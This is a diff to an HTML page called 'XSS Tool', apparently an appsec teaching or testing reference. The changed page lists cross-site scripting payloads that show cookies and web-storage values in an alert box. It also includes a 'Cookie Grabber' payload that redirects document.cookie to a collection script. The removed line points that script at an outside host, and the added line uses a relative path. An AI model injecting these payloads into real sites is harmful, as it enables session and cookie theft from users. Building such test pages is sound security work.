@@ -12,7 +12,13 @@
           e.style.display = (e.style.display == 'none') ? 'block' : 'none';
       }
   //]]>
-  </script>
+
+        if(typeof(Storage)!=="undefined"){
+            localStorage.localKey="localValue";
+            sessionStorage.sessionKey="sessionValue";
+        }
+    </script>
+    
     <div id="main">
     <h1>XSS Tool</h1>
     <div id="divContainer" align=center>
@@ -75,8 +81,15 @@
           <td colspan=2><hr></td>
           </tr>
           <tr> 
-          <td>XSS </td>
+          <td>XSS cookie</td>
           <td><font size=2 color=#0196e3 face=monospace><i>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</i></font></td>
+          </tr>
+          <tr> 
+          <td colspan=2><hr border=1></td>
+          </tr>
+          
+          <td>XSS webstorage</td>
+          <td><font size=2 color=#0196e3 face=monospace><i>&lt;script&gt;alert('localStorage: '+localStorage.localKey+'\nsessionStorage: '+sessionStorage.sessionKey)&lt;/script&gt;</i></font></td>
           </tr>
           <tr> 
           <td colspan=2><hr border=1></td>
@@ -93,7 +106,7 @@
           
           <tr> 
           <td>XSS Cookie Grabber</a></td>
-          <td><font size=2 color=#0196e3 face=monospace><i>&lt;script&gt;document.location='http://rajivvishwa.koding.com/appsec/xss/cgrab.php?cookie=' + document.cookie&lt;/script&gt;</i></font></td>
+          <td><font size=2 color=#0196e3 face=monospace><i>&lt;script&gt;document.location='/appsec/xss/cgrab.php?cookie=' + document.cookie&lt;/script&gt;</i></font></td>
           </tr>
           <tr> 
           <td colspan=2><hr border=1></td>
